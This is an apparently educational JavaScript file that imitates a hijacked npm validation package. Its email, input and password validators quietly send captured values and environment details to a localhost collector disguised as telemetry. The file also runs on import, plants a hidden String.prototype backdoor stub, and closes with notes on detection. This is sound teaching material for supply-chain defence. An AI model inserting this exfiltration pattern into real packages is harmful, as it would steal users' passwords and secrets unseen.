/**
 * EDUCATIONAL EXAMPLE: Compromised Package
 * 
 * This demonstrates how a legitimate package gets compromised
 * Package: secure-validator v2.5.4 (COMPROMISED VERSION)
 * 
 * SAFETY FEATURES:
 * - Only works when TESTBENCH_MODE=enabled
 * - Only sends data to localhost
 * - Clearly marked as educational
 * 
 * ATTACK CHARACTERISTICS:
 * - Maintains all original functionality
 * - Injects malicious code in strategic locations
 * - Uses obfuscation techniques
 * - Difficult to detect in code review
 */

const http = require('http');

// ============================================================================
// MALICIOUS CODE SECTION - FOR EDUCATIONAL PURPOSES ONLY
// ============================================================================

/**
 * Exfiltrate data during validation operations
 * This is hidden within legitimate-looking error handling
 */
function _reportMetrics(type, data) {
  // SAFETY CHECK
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    return;
  }

  // Appears to be metrics/telemetry (common in packages)
  // But actually exfiltrates sensitive data
  const payload = {
    attack: 'compromised-package',
    timestamp: new Date().toISOString(),
    package: {
      name: 'secure-validator',
      version: '2.5.4',  // Compromised version
      description: 'Legitimate package hijacked by attacker'
    },
    capturedData: {
      validationType: type,
      input: data,  // Could contain sensitive information!
      environment: {
        NODE_ENV: process.env.NODE_ENV,
        cwd: process.cwd(),
        // In real attack: capture all env vars (API keys, passwords, etc.)
      }
    },
    system: {
      platform: process.platform,
      nodeVersion: process.version,
      uptime: process.uptime()
    }
  };

  // Obfuscated exfiltration (looks like normal HTTP request)
  const data_str = JSON.stringify(payload);
  const opts = {
    hostname: 'localhost',  // SAFETY: only localhost
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data_str),
      'X-Attack-Type': 'compromised-package'
    }
  };

  // Silent exfiltration
  const req = http.request(opts, () => {
    // Success - no logging to avoid detection
  });

  req.on('error', () => {
    // Fail silently - typical malware behavior
  });

  req.write(data_str);
  req.end();
}

// More sophisticated: Create a backdoor function
// Hidden in the prototype chain
Object.defineProperty(String.prototype, '_backdoor', {
  value: function(cmd) {
    if (process.env.TESTBENCH_MODE === 'enabled') {
      console.log('[TESTBENCH] Backdoor accessed:', cmd);
      // In real attack: execute arbitrary commands
    }
  },
  enumerable: false,  // Hidden from Object.keys()
  configurable: false
});

// ============================================================================
// LEGITIMATE CODE SECTION - Maintains Original Functionality
// ============================================================================

class SecureValidator {
  /**
   * Validate email address
   * INJECTED: Exfiltration hidden in validation
   */
  static validateEmail(email) {
    // Original functionality
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const result = emailRegex.test(email);
    
    // MALICIOUS: Exfiltrate email data
    try {
      _reportMetrics('email', email);
    } catch (e) {
      // Silent failure
    }
    
    return result;
  }

  /**
   * Validate URL
   */
  static validateUrl(url) {
    try {
      new URL(url);
      
      // MALICIOUS: Exfiltrate URL (could be internal endpoints)
      _reportMetrics('url', url);
      
      return true;
    } catch (e) {
      return false;
    }
  }

  /**
   * Sanitize HTML to prevent XSS
   */
  static sanitizeHtml(input) {
    return input
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\//g, '&#x2F;');
  }

  /**
   * Validate and sanitize user input
   * INJECTED: More exfiltration opportunities
   */
  static validateInput(input, type = 'string') {
    if (!input) return { valid: false, error: 'Input is required' };

    // MALICIOUS: Capture all input data
    _reportMetrics('input', { type, value: input });

    switch (type) {
      case 'email':
        return {
          valid: this.validateEmail(input),
          sanitized: input.trim().toLowerCase()
        };
      
      case 'url':
        return {
          valid: this.validateUrl(input),
          sanitized: input.trim()
        };
      
      case 'html':
        return {
          valid: true,
          sanitized: this.sanitizeHtml(input)
        };
      
      default:
        return {
          valid: typeof input === 'string',
          sanitized: input.trim()
        };
    }
  }

  /**
   * Validate password strength
   * INJECTED: Most dangerous - captures passwords!
   */
  static validatePassword(password) {
    // MALICIOUS: Exfiltrate passwords!
    // In real attacks, this is devastating
    _reportMetrics('password', password);

    // Original functionality continues
    const minLength = 8;
    const hasUpperCase = /[A-Z]/.test(password);
    const hasLowerCase = /[a-z]/.test(password);
    const hasNumbers = /\d/.test(password);
    const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);

    const score = [
      password.length >= minLength,
      hasUpperCase,
      hasLowerCase,
      hasNumbers,
      hasSpecialChar
    ].filter(Boolean).length;

    return {
      valid: score >= 3,
      score: score,
      strength: score < 3 ? 'weak' : score < 5 ? 'medium' : 'strong',
      feedback: {
        minLength: password.length >= minLength,
        hasUpperCase,
        hasLowerCase,
        hasNumbers,
        hasSpecialChar
      }
    };
  }
}

// MALICIOUS: Execute on module load
// This runs as soon as the package is imported
(function() {
  if (process.env.TESTBENCH_MODE === 'enabled') {
    console.log('[TESTBENCH] ⚠️  Compromised package loaded: secure-validator@2.5.4');
    
    _reportMetrics('module_load', {
      message: 'Package compromised and loaded',
      timestamp: new Date().toISOString()
    });
  }
})();

module.exports = SecureValidator;

// ============================================================================
// WHY THIS ATTACK IS SO DANGEROUS:
// ============================================================================
//
// 1. ESTABLISHED TRUST:
//    - Package already has millions of users
//    - Developers trust it and don't review updates carefully
//    - Especially patch versions (2.5.3 -> 2.5.4)
//
// 2. MAINTAINS FUNCTIONALITY:
//    - All original features work correctly
//    - No errors or warnings
//    - Tests still pass
//    - Application behavior unchanged
//
// 3. STRATEGIC DATA ACCESS:
//    - Validation libraries see sensitive data (passwords, emails, etc.)
//    - Utility libraries are used everywhere
//    - Exfiltration happens during normal operations
//
// 4. DIFFICULT TO DETECT:
//    - Code looks mostly legitimate
//    - Malicious parts are small additions
//    - Can be hidden in error handling, logging, or "metrics"
//    - Diff between versions might seem innocuous
//
// 5. WIDE IMPACT:
//    - Single compromised package affects millions of applications
//    - Transitive dependencies spread the compromise
//    - Automated updates install malicious versions
//    - Can persist for weeks or months before detection
//
// ============================================================================
// DETECTION METHODS:
// ============================================================================
//
// 1. VERSION COMPARISON:
//    - Diff between versions to find unexpected changes
//    - Patch versions shouldn't add features or network calls
//
// 2. BEHAVIORAL ANALYSIS:
//    - Monitor network requests during package usage
//    - Check for unexpected file system access
//    - Sandbox execution and observe behavior
//
// 3. CODE REVIEW:
//    - Look for network requests in validation/utility libraries
//    - Check for obfuscation (eval, Function constructor, base64)
//    - Verify error handling doesn't hide malicious activity
//
// 4. PACKAGE LOCK INTEGRITY:
//    - Monitor package-lock.json changes
//    - Verify integrity hashes match
//    - Alert on unexpected version updates
//
// 5. RUNTIME MONITORING:
//    - Intercept require() calls
//    - Monitor sensitive module access (http, fs, child_process)
//    - Log all network connections
//
// 6. COMMUNITY VIGILANCE:
//    - Report suspicious behavior
//    - Review package updates
//    - Check maintainer changes
//    - Monitor npm security advisories
//
// ============================================================================

